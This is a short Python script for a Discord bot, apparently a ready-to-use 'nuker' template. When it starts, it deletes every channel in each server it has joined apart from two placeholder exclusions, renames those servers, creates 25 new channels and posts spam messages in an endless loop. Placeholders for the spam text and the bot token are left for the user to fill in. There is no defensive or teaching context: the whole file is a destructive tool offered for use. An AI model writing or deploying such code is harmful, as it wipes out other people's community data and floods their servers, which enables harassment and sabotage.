import discord #Mandatory to use this to operate
from discord.ext import commands

# Needed intents
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents) # Basically does nothing

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    guild = bot.guilds[0]  # Assumes the bot is only in one server
    
    excluded_servers = [2101234567898765432, 1234567890987654321]  # Replace with actual server IDs
    
    for server in bot.guilds:
        if server.id in excluded_servers:
            continue

        for channel in server.channels:
            await channel.delete()

        await server.edit(name='Replace This by choice')

    # Create 25 channels with the name 'your-choice-here'
    for _ in range(25):
        await guild.create_text_channel('your-choice-here')
    
    # Spam the channels with messages
    while True:
        for channel in guild.channels:
            try:
                await channel.send('your spam message here')
            except:
                pass

bot.run('YOUR_BOTS_TOKEN_HERE')